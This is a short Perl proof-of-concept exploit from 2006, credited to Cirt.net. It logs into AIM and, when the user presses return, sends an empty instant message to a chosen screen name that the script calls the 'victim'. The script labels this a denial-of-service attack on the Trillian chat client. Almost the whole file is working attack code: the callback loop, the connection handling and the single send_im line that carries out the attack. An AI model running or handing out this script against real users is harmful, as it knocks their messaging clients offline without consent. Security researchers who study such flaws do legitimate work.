#!/usr/bin/perl
# ********************************************************* #
# (c) 2006 Sullo / Cirt.net
# Some of this code was written by Matthew Sachs (Net::OScar author) 
# in module examples.
# ********************************************************* #
# This program is intended for use in an authorized manner only, and the author
# can not be held liable for anything done with this program or code.
# ********************************************************* #

use Net::OSCAR qw(:standard);
use IO::Poll;

# ********************************************************* #
# Signon information must be supplied here
my $screenname  = "";
my $password    = "";
# ********************************************************* #

# ********************************************************* #
# Check for victim & attacker information
my $victim=$ARGV[0];
if ($victim eq "") 
 { 
   print "Trillian blank message DoS\n";
   print "(c) 2006 Cirt.net\n";
   print "$0 <AIM Victim>\n"; 
   exit; 
 }
elsif (($screenname eq "") || ($password eq ""))
 {
   print "ERROR: connection information must be supplied inside $0\n";
   exit;
 }

# ********************************************************* #
# Set up the OSCAR handlers & connect
my %fdmap;
my $poll = IO::Poll->new();
$poll->mask(STDIN => POLLIN);
my $oscar = Net::OSCAR->new();
$oscar->set_callback_error(\&error);
$oscar->set_callback_signon_done(\&signed_on);
$oscar->set_callback_im_ok(\&msg_sent);
$oscar->set_callback_connection_changed(\&connection_changed);
$oscar->signon(screenname => $screenname, password => $password);

# ********************************************************* #
# Sit in a while loop until we get the trigger to attack. This will give
# the code time to connect to AIM before sending.
while(1) {
	next unless $poll->poll();
	my $got_stdin = 0;
	my @handles = $poll->handles(POLLIN | POLLOUT | POLLHUP | POLLERR | POLLNVAL);
	foreach my $handle (@handles) {
		if(fileno($handle) == fileno(STDIN)) {
			$got_stdin = 1;
		} else {
			my($read, $write, $error) = (0, 0, 0);
			my $events = $poll->events($handle);
			$read = 1 if $events & POLLIN;
			$write = 1 if $events & POLLOUT;
			$error = 1 if $events & (POLLNVAL | POLLERR | POLLHUP);
			$fdmap{fileno($handle)}->process_one($read, $write, $error);
		}
	}
	# ********************************************************* #
	# if we got a newline, trigger the attack. otherwise loop again.
	next unless $got_stdin;
	sysread(STDIN, my $inchar, 1);
	# ********************************************************* #
	# here's the actual attack. 
	if($inchar eq "\n") { $oscar->send_im($victim,""); exit; }
}

# ********************************************************* #
# Basic error handling
sub error($$$$$) {
	my($oscar, $connection, $errno, $error, $fatal) = @_;
	if($fatal) {
		die "Fatal error $errno in ".$connection->{description}.": $error\n";
	} else { print STDERR "Error $errno: $error\n"; }
}

# ********************************************************* #
# Return sign-on OK message
sub signed_on() { print "You are now signed on to AIM.\nPress return to send the blank IM to '$victim'.\n"; }

# ********************************************************* #
# Confirm message has been sent OK
sub msg_sent() { print "Message Sent.\n"; }

# ********************************************************* #
# Basic change handling in case we go offline in the while() loop
sub connection_changed($$$) {
	my($oscar, $connection, $status) = @_;

	my $h = $connection->get_filehandle();
	my $mask = 0;

	if($status eq "deleted") {
		delete $fdmap{fileno($h)};
	} else {
		$fdmap{fileno($h)} = $connection;
		if($status eq "read") {
			$mask = POLLIN;
		} elsif($status eq "write") {
			$mask = POLLOUT;
		} elsif($status eq "readwrite") {
			$mask = POLLIN | POLLOUT;
		}
	}
	$poll->mask($h => $mask);
}
